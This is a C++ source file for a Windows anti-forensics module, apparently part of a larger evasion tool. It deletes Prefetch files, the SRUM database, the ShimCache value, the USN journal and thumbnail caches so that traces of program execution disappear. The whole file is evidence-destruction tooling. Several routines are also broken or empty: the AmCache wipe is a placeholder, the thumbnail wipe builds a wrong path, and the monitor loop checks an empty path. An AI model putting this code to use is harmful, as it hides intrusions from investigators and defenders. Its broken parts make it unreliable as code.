#include "cache_wiper.hpp"
#include <windows.h>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <filesystem>

namespace l4g::evasion {

CacheWiper::CacheWiper() = default;

CacheWiper::~CacheWiper() {
    stop_monitoring();
}

void CacheWiper::start_monitoring() {
    if (running_.exchange(true)) return;
    monitor_thread_ = std::thread(&CacheWiper::monitor_loop, this);
}

void CacheWiper::stop_monitoring() {
    if (!running_.exchange(false)) return;
    if (monitor_thread_.joinable()) monitor_thread_.join();
}

bool CacheWiper::delete_prefetch_files(const wchar_t* pattern) {
    std::wstring prefetch_dir = L"C:\\Windows\\Prefetch\\";
    std::wstring search = prefetch_dir + (pattern ? pattern : L"*.pf");
    
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return false;
    
    bool ok = true;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            std::wstring path = prefetch_dir + fd.cFileName;
            if (!DeleteFileW(path.c_str())) ok = false;
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    return ok;
}

bool CacheWiper::delete_amcache_entries(const wchar_t* exe_name) {
    // AmCache is in registry: HKLM\SYSTEM\CurrentControlSet\Control\AmCache
    // Requires parsing hive - simplified: just delete recent entries
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\AmCache", 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    // Enumerate and delete entries matching exe_name
    // This is complex - placeholder
    RegCloseKey(hKey);
    return true;
}

bool CacheWiper::clear_srum_database() {
    // SRUDB.dat in C:\Windows\System32\sru\SRUDB.dat
    // Stop DiagTrack service, delete file, restart
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    
    SC_HANDLE svc = OpenServiceW(scm, L"DiagTrack", SERVICE_STOP | SERVICE_START);
    bool ok = false;
    if (svc) {
        SERVICE_STATUS status = {};
        if (ControlService(svc, SERVICE_CONTROL_STOP, &status)) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            std::wstring sru_path = L"C:\\Windows\\System32\\sru\\SRUDB.dat";
            if (DeleteFileW(sru_path.c_str())) {
                ok = true;
            }
            StartServiceW(svc, 0, nullptr);
        }
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return ok;
}

bool CacheWiper::clear_shimcache() {
    // ShimCache in registry: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
    HKEY hKey = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, L"AppCompatCache");
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

bool CacheWiper::disable_usn_journal() {
    // Disable USN journal on C:
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hVol == INVALID_HANDLE_VALUE) return false;
    
    DELETE_USN_JOURNAL_DATA data = {0, USN_DELETE_FLAG_DELETE};
    DWORD bytes = 0;
    bool ok = DeviceIoControl(hVol, FSCTL_DELETE_USN_JOURNAL, &data, sizeof(data), nullptr, 0, &bytes, nullptr);
    CloseHandle(hVol);
    return ok;
}

bool CacheWiper::wipe_prefetch(const wchar_t* exe_name) {
    if (exe_name) {
        std::wstring pattern = std::wstring(exe_name) + L"-*.pf";
        return delete_prefetch_files(pattern.c_str());
    }
    return delete_prefetch_files(nullptr);
}

bool CacheWiper::wipe_amcache(const wchar_t* exe_name) {
    return delete_amcache_entries(exe_name);
}

bool CacheWiper::wipe_srum() {
    return clear_srum_database();
}

bool CacheWiper::wipe_shimcache() {
    return clear_shimcache();
}

bool CacheWiper::wipe_usn_journal() {
    return disable_usn_journal();
}

bool CacheWiper::wipe_thumbnail_cache() {
    std::wstring thumb_dir = std::wstring(std::getenv("LOCALAPPDATA")) + L"\\Microsoft\\Windows\\Explorer\\thumbcache_*.db";
    // Use SHFileOperation or manual delete
    return delete_prefetch_files(thumb_dir.c_str());
}

bool CacheWiper::wipe_all_caches() {
    bool ok = true;
    ok &= wipe_prefetch(nullptr);
    ok &= wipe_amcache(nullptr);
    ok &= wipe_srum();
    ok &= wipe_shimcache();
    ok &= wipe_thumbnail_cache();
    return ok;
}

bool CacheWiper::wipe_on_write(const wchar_t* file_path) {
    // Called immediately after any cache file write
    // Delete the file if it's in a cache directory
    std::wstring path(file_path);
    std::wstring lower = path;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    
    if (lower.find(L"\\prefetch\\") != std::wstring::npos ||
        lower.find(L"\\amcache") != std::wstring::npos ||
        lower.find(L"\\sru\\") != std::wstring::npos ||
        lower.find(L"\\thumbcache_") != std::wstring::npos) {
        DeleteFileW(file_path);
        return true;
    }
    return false;
}

void CacheWiper::monitor_loop() {
    while (running_.load()) {
        // Periodic wipe
        wipe_on_write(L""); // Trigger check
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

} // namespace l4g::evasion